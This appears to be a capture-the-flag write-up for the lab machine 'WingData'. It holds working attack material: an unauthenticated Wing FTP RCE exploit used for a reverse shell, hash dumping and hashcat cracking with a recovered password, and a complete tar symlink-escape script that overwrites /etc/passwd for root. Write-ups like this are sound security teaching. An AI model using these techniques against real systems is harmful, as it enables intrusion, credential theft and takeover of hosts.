---
title: "WingData"
os: Linux
difficulty: Easy
tags: [web, ftp, rce, sudo-abuse, tar-symlink, privesc]
---

## Overview

WingData is an easy-difficulty Linux machine built around an exposed Wing FTP Server instance. The path to root runs through an unauthenticated RCE in the FTP web client, credential harvesting from on-disk configuration files, a cracked user password via hashcat, and a sudo-scoped Python backup script vulnerable to a symlink/path-traversal trick during tar extraction — which allows overwriting `/etc/passwd` and dropping straight to root.

## Reconnaissance

Started with a standard service scan against the target:

```
sudo nmap -sC -sV 10.129.8.220
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-15 22:24 UTC
Nmap scan report for 10.129.8.220
Host is up (0.057s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-title: Did not follow redirect to http://wingdata.htb/
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.83 seconds
```

Only two ports open: SSH and a web server redirecting to `wingdata.htb`, so that domain was added to `/etc/hosts` before doing anything else.

I first visited the webpage.

![WingData homepage](/assets/images/wingdata-homepage.png)

The site's "Client Portal" link pointed to an `ftp.wingdata.htb` subdomain, which was added to `/etc/hosts` as well. This resolved to a Wing FTP Server web login page.

I visited ftp

![Wing FTP login portal](/assets/images/wingdata-ftp-login.png)

The login page conveniently disclosed the exact Wing FTP Server version in the footer — enough to go looking for a matching public exploit before trying anything more manual.

## Foothold — Unauthenticated RCE

Got remote code execution with this https://www.exploit-db.com/exploits/52347

This PoC targets an unauthenticated command execution flaw in the Wing FTP web client. I used it first just to confirm the vulnerability was live and see what I was working with:

```
python3 exploit.py -u http://ftp.wingdata.htb -c "cat /etc/passwd"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'cat /etc/passwd' and username: 'anonymous'
--- Command Output ---
root:x:0:0:root:/root:/bin/bash
...
wingftp:x:1000:1000:WingFTP Daemon User,,,:/opt/wingftp:/bin/bash
wacky:x:1001:1001::/home/wacky:/bin/bash
```

Confirmed command execution as the `wingftp` service account, and picked up two usernames worth remembering for later: `wingftp` and `wacky`.

A quick follow-up confirmed `wacky` is the only real user on the box outside of service accounts — a solid pivot target once I found credentials.

The first exploit script only supports arbitrary command execution, one command at a time, which is workable but slow for deeper enumeration. Found a different script on GitHub that supports a direct reverse shell for the same vulnerability class: https://github.com/0xcan1337/CVE-2025-47812-poC

```
python3 exploit2.py
Target URL: http://ftp.wingdata.htb
Username: anonymous
Choice: 2 (Get Reverse Shell)
Reverse shell IP address: <attacker IP>
```

With a listener running (`rlwrap nc -lvnp 4444`), the exploit landed a shell as `wingftp`. I stabilized it with the standard PTY upgrade:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

## Post-Exploitation — Credential Harvesting

Wing FTP keeps its runtime state — logs, user configs, admin accounts — under `/opt/wftpserver`. The admin log gave a quick timeline of every account that had been created:

```
cat Admin-2025-11-2.log
[01] Sun, 02 Nov 2025 11:12:38 administrator 'admin' added a user 'anonymous'. [1]
[01] Sun, 02 Nov 2025 11:13:05 administrator 'admin' added a user 'john'. [1]
[01] Sun, 02 Nov 2025 12:02:45 administrator 'admin' added a user 'steve'. [1]
[01] Sun, 02 Nov 2025 12:04:49 administrator 'admin' added a user 'wacky'. [1]
[01] Sun, 02 Nov 2025 12:05:56 administrator 'admin' added a user 'maria'. [1]
```

Confirmed the full user list: `anonymous`, `john`, `steve`, `wacky`, `maria`.

I also found an SSH host key sitting in the Wing FTP data directory — this turned out to be a dead end for the attack path (it's the box's own SSH host key, not tied to any specific user), so it isn't reproduced here.

Digging into the admin account config revealed a password hash with no obvious salt field:

```
cat /opt/wftpserver/Data/_ADMINISTRATOR/admins.xml
<Admin_Name>admin</Admin_Name>
<Password>a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba</Password>
```

Rather than guess blindly, I tested a theory: Wing FTP might append a static string to the plaintext password before hashing — the string "WingFTP" shows up everywhere in the product's file paths and naming.

Dumped hashes for every user account by looping through their XML configs:

```
for u in /opt/wftpserver/Data/1/users/*.xml; do
  echo -e "\n==== $u ===="
  grep -nE "Password" "$u"
done

==== .../anonymous.xml ====  Password: d67f86152e5c4df1b0ac4a18d3ca4a89c1b12e6b748ed71d01aeb92341927bca
==== .../john.xml ====       Password: c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10
==== .../maria.xml ====      Password: a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03
==== .../steve.xml ====      Password: 5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca
==== .../wacky.xml ====      Password: 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
```

Five hashes, same format, same missing salt field — strongly suggesting a shared static-suffix scheme. To confirm rather than assume, I set a known password on the writable `steve.xml` file directly and generated the matching hash myself:

```
python3 - <<'PY'
import hashlib
pw="Pwned123!"
print(hashlib.sha256((pw+"WingFTP").encode()).hexdigest())
PY
17da06ab1377a1b77c10c3fe070551ad4ab8cf2bf98b9301c3f24455e398399d

sed -i "s#<Password>.*</Password>#<Password>17da06ab...</Password>#g" /opt/wftpserver/Data/1/users/steve.xml
```

![Password field updated in steve's config](/assets/images/wingdata-password-reset.png)

Logging in with the new password confirmed the `sha256(password + "WingFTP")` scheme was correct.

With the scheme confirmed, I targeted `wacky`'s hash directly with hashcat, using a one-line dictionary containing just the known suffix:

```
echo WingFTP > dict2.txt
hashcat -a 1 -m 1400 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca /usr/share/wordlists/rockyou.txt dict2.txt

32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:!#7Blushing^*Bride5WingFTP
Status: Cracked
Time.Started: 7 secs
```

Cracked in 7 seconds. The real password (with the suffix stripped) is `!#7Blushing^*Bride5`. I used it to SSH in as `wacky`.

## Privilege Escalation — Sudo Script Abuse

```
wacky@wingdata:~$ sudo -l
User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3
        /opt/backup_clients/restore_backup_clients.py *
```

`wacky` can run a backup-restore script as root with no password, passing arbitrary arguments. That script extracts a tar archive the caller supplies — a classic setup for a tar symlink/path-traversal escape, where a maliciously-crafted archive can write files outside the intended extraction directory.

Built a malicious tar using a modified public tar-symlink escape PoC:

```python
import tarfile, os, io

with open("passwd", "rb") as f:
    passwd_content = f.read()

comp = 'd' * 247
steps = "abcdefghijklmnop"
path = ""

with tarfile.open("backup_4000.tar", mode="w") as tar:
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)
        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)
        path = os.path.join(path, comp)

    linkpath = os.path.join("/".join(steps), "l"*254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = ("../" * len(steps))
    tar.addfile(l)

    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../../../etc"
    tar.addfile(e)

    f = tarfile.TarInfo("escape/passwd")
    f.type = tarfile.REGTYPE
    f.size = len(passwd_content)
    tar.addfile(f, fileobj=io.BytesIO(passwd_content))
```

**Why this works:** the script builds a long chain of nested directories, each paired with a symlink, then adds a final symlink (`escape`) that walks back up through that chain and out into `/etc`. When the restore script extracts the archive and follows that chain, writing `escape/passwd` lands on the real `/etc/passwd` — because tar follows symlinks it just created during the same extraction, and the restore script never validates that extracted paths stay inside the intended output directory. The payload itself is the original `passwd` file with one appended line: a new `pwn` user with UID/GID `0`.

```
python3 poc_passwd.py
mv backup_4000.tar /opt/backup_clients/backups/
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_4000.tar -r restore_passwd
```

The restore script ran as root and, via the symlink chain, overwrote `/etc/passwd` with the modified version — adding `pwn` with root's UID and GID.

```
su pwn
id
# uid=0(root) gid=0(root) groups=0(root)
```

`su pwn` needs no password, since the new entry has no password hash set.

## Root

```
cat /root/root.txt
23211bd8eca51b5bbbbe91002a1a725b
```

## Lessons Learned

- Version disclosure on login pages is a gift to an attacker — always check for this before anything more invasive.
- Custom hashing schemes aren't automatically secure. A static suffix appended before hashing looks safe at a glance, but it's trivially discoverable once you have one plaintext/hash pair to test against — and from there, every other account on the box becomes crackable.
- Sudo rules that pass through to file-extraction logic are high-risk. Any time a sudo-permitted script extracts a user-supplied archive, check whether it validates that extracted paths stay inside the intended directory — symlink chains inside tar archives are a well-known way to escape that boundary.

